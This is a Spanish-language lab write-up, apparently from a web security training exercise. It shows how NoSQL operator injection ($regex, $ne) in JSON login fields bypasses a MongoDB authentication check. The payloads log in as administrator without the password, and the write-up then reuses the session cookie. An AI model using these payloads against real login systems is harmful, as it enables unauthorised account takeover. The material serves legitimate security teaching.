# 💉 Bypass de login con inyección de operadores NoSQL

## 📄 Descripción del laboratorio

El sistema de autenticación está respaldado por **MongoDB** y construye la consulta de login sin sanitizar correctamente los parámetros `username` y `password`.

La aplicación permite que el input se interprete como **objetos JSON**, lo que abre la posibilidad de utilizar operadores NoSQL como `$ne` o `$regex`.

**Objetivo del laboratorio:**

* Iniciar sesión como **administrator**
* Sin conocer la contraseña real
* Manipulando la lógica de la consulta mediante operadores NoSQL

Credenciales de prueba:

```
wiener:peter
```

 

## 📚 Teoría

En implementaciones inseguras, una consulta de autenticación puede verse así:

```javascript
db.users.findOne({
  username: req.body.username,
  password: req.body.password
})
```

Si el backend:

* Acepta **JSON directamente**
* No valida los **tipos de datos**
* No bloquea **operadores de MongoDB**

entonces un atacante puede enviar **operadores en lugar de valores simples**.

### Operadores utilizados en bypass

Algunos operadores útiles para manipular consultas:

```
$ne
$regex
$gt
$in
$exists
```

Ejemplos:

```json
{"$ne": null}
```

El campo es distinto de null.

```json
{"$regex": "admin.*"}
```

Selecciona usuarios cuyo nombre empiece por `admin`.

```json
{"$ne": "valor"}
```

La condición será verdadera si la contraseña almacenada es distinta de ese valor.

Esto permite **alterar completamente la lógica de autenticación**.

### 2️⃣ Confirmación de parsing NoSQL

Probamos a enviar un operador `$regex` en el campo `username`:

```json
{
  "username": {"$regex": "wiener"},
  "password": "peter"
}
```

<br>
El login funciona, lo que indica que **MongoDB está interpretando objetos JSON**.

Probamos una expresión más amplia:

```json
{
  "username": {"$regex": "wie.*"},
  "password": "peter"
}
```

<br>
El login sigue siendo válido, confirmando que **las regex son aceptadas en la consulta**.

 

### 3️⃣ Bypass con operadores

Intentamos el bypass utilizando `$ne` en la contraseña:

```json
{
  "username": "administrator",
  "password": {"$ne": "random"}
}
```

<br>
Respuesta:

```
Invalid username
```

Esto indica que el nombre exacto no coincide.

Probamos entonces utilizando regex para el usuario administrativo:

```json
{
  "username": {"$regex": "admin.*"},
  "password": {"$ne": "random"}
}
```

### 4️⃣ Toma de sesión

El login es exitoso para un usuario cuyo nombre comienza por `admin`.

Copiamos la **cookie de sesión** generada tras el login y la utilizamos en el navegador.

Al acceder a la aplicación, estamos autenticados como:

```
administrator
```
